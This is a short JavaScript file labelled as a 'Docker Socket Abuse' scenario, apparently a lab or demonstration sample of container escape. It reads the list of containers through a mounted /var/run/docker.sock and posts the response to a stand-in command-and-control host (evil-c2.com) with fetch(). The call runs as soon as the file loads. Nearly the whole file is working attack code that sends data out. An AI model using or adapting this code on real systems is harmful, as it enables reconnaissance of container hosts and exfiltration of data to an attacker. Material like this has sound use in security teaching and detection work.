// Scenario: Docker Socket Abuse
// Escaping container via mounted docker socket
import http from 'http';

function listContainers() {
  const options = {
    socketPath: '/var/run/docker.sock',
    path: '/v1.41/containers/json',
  };

  const req = http.get(options, (res) => {
    res.on('data', (d) => {
      // Send container list to highlight escape targets
      fetch('https://evil-c2.com/docker', { method: 'POST', body: d });
    });
  });
  req.end();
}

listContainers();
